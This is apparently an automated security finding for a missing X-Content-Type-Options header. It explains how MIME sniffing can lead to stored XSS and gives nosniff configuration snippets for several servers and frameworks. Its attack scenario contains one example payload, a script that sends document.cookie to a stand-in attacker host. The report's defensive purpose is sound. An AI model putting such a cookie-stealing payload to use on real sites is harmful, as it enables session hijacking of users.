# WPOC-983F39: Missing X-Content-Type-Options Header

**Severity:** LOW  
**Confidence:** HIGH  
**Status:** CONFIRMED  

**Affected endpoint:** `GET http://127.0.0.1/`
**Parameter:** `x-content-type-options`
**Input used:** `(not set)`

## Summary

The X-Content-Type-Options header is not set, allowing browsers to perform MIME-sniffing on responses. A text/plain response that the server intended as harmless text could be reinterpreted by the browser as HTML or JavaScript, enabling stored XSS even on endpoints that carefully set Content-Type.

## Technical explanation

Browsers perform 'MIME sniffing' to guess the actual content type when the declared Content-Type is missing, generic (text/plain), or inconsistent with the response body. An attacker who can upload or store content via a text-typed endpoint can craft a payload that sniffs as HTML and executes scripts in the application's origin. Setting `X-Content-Type-Options: nosniff` instructs the browser to strictly honor the declared Content-Type and refuse to sniff.

## Attack scenario

1. Application accepts user-uploaded text and stores it; serves it back with `Content-Type: text/plain`
2. Attacker uploads a payload that begins with HTML (e.g. `<script>fetch('//evil.example/?c='+document.cookie)</script>`)
3. Victim views the page; without nosniff the browser sniffs the body as HTML and executes the script
4. Attacker's script runs in the application's origin and exfiltrates cookies or makes credentialed requests
5. With `nosniff`, the browser would render the response as plaintext and the script would never execute

## Impact

Stored XSS via MIME confusion — bypasses many application-level defenses because the developer believes the endpoint is 'just text'. Combined with a permissive CORS or same-origin XHR, attackers can read or modify sensitive data within the application's origin.

## Remediation

1. Add `X-Content-Type-Options: nosniff` to every response that serves user-controlled or untrusted content.
2. Audit upload endpoints to ensure the server-supplied Content-Type matches the actual content (or set Content-Disposition to force download).
3. Pair with a strong Content-Security-Policy so that even if a sniffing bypass succeeds, the inline script cannot run.

## Code examples

### nginx

```
add_header X-Content-Type-Options "nosniff" always;
```

### apache

```
Header always set X-Content-Type-Options "nosniff"
```

### express

```
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

### flask

```
@app.after_request
def nosniff(resp):
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    return resp
```

### django

```
SECURE_CONTENT_TYPE_NOSNIFF = True  # in settings.py
```
